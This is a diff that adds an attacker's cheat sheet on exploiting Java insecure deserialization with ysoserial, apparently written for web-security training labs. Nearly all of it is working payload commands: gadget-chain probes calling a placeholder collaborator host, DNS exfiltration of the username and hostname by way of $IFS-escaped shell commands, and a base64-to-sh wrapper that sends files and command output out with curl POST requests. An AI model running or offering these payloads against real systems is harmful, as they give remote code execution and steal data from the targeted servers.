@@ -1,0 +1,72 @@
+Insecure Deserializaton notes
+
+Phase 1: Blind Detection (Universal DNS Check)
+
+Run first to confirm the application is actually deserializing Java objects without relying on specific third-party library chains:
+
+Bash
+
+
+ysoserial URLDNS "http://test.YOUR-COLLAB.oastify.com"
+
+Phase 2: Gadget Chain Discovery (DNS Ping-Backs with Tags)
+
+Spray common chains with unique subdomain tags to find which library exists on the target classpath:
+
+    Commons Collections 4.x Check:
+    Bash
+
+ysoserial CommonsCollections4 "nslookup cc4.YOUR-COLLAB.oastify.com"
+
+    Commons Collections 3.x Check:
+    Bash
+
+ysoserial CommonsCollections6 "nslookup cc6.YOUR-COLLAB.oastify.com"
+
+    Commons BeanUtils Check:
+    Bash
+
+ysoserial CommonsBeanutils1 "nslookup cb1.YOUR-COLLAB.oastify.com"
+
+Phase 3: Dynamic Data Exfiltration via DNS (Single Tokens)
+
+Exfiltrate system details using double quotes and escaped \$IFS:
+
+    Exfiltrate Current User:
+    Bash
+
+ysoserial CommonsCollections4 "sh -c nslookup\$IFS\`whoami\`.YOUR-COLLAB.oastify.com"
+
+    Exfiltrate Hostname:
+    Bash
+
+ysoserial CommonsCollections4 "sh -c nslookup\$IFS\`hostname\`.YOUR-COLLAB.oastify.com"
+
+    Exfiltrate Both:
+    Bash
+
+ysoserial CommonsCollections4 "sh -c nslookup\$IFS\`whoami\`.\`hostname\`.YOUR-COLLAB.oastify.com"
+
+Phase 4: Full Multi-Line & File Exfiltration (Base64 Wrapper via HTTP POST)
+
+Use the 2-step Base64 wrapper to handle spaces, quotes, newlines, and binary files without breaking Java's command tokenizer:
+
+    Step 1: Encode your intended shell command locally
+    Bash
+
+# Reading files:
+echo -n 'curl -d @/path/to/file http://YOUR-COLLAB.oastify.com' | base64
+
+# Or capturing full command output (e.g., directory listing):
+echo -n 'curl -d "$(ls -la /home/carlos)" http://YOUR-COLLAB.oastify.com' | base64
+
+    Step 2: Feed the Base64 string into ysoserial
+    Bash
+
+ysoserial CommonsCollections4 "sh -c echo\${IFS}<YOUR_BASE64_STRING>\${IFS}|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}sh"
+
+    Step 3: Read the data in Burp Collaborator
+    Filter for HTTP interactions.
+    Click the incoming interaction, open Request to Collaborator, and view the exfiltrated contents inside the raw POST body.
+
+
